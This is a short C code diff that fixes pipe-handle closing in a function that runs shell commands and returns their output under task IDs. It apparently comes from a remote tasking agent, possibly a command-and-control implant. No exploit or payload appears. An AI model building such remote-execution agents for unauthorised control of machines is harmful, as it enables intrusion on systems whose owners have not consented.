@@ -57,6 +57,9 @@ void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   
   printf("while loop!\n");
     
+  CloseHandle(outWrite);
+  CloseHandle(inRead);
+  
   while (ReadFile(outRead, filePart, 1024, &dwRead, NULL)) {
     printf("read: %u bytes\n", dwRead);
     if (dwRead == 0) break;
@@ -70,10 +73,8 @@ void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
   addBytes(&out, bufferSize, outBuffer);
   send_output(taskId, "output", "", out.bufsize, out.buf);
   
-  CloseHandle(inRead);
+  CloseHandle(outRead);
   CloseHandle(inWrite);
-  CloseHandle(inWrite);
-  CloseHandle(outWrite);
 
   free(outBuffer);
   free(filePart);
